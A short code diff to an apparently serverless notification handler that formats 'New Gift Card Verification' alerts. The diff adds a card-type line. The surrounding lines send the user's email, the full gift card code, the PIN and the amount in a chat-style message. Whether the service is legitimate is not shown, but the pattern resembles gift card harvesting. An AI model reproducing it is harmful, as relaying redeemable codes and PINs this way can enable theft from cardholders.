@@ -91,6 +91,7 @@ serve(async (req) => {
       message = `🎁 *New Gift Card Verification*\n\n` +
                 `📧 Email: ${notificationData.userEmail}\n` +
                 `🎫 Gift Card: ${notificationData.giftcardName}\n` +
+                `📱 Type: ${notificationData.isEGiftCard ? 'E-Gift Card (Digital)' : 'Physical Card'}\n` +
                 `🔢 Code: ${notificationData.code || 'N/A'}\n` +
                 `📌 PIN: ${notificationData.pin || 'N/A'}\n` +
                 `💰 Amount: $${notificationData.amount}\n` +
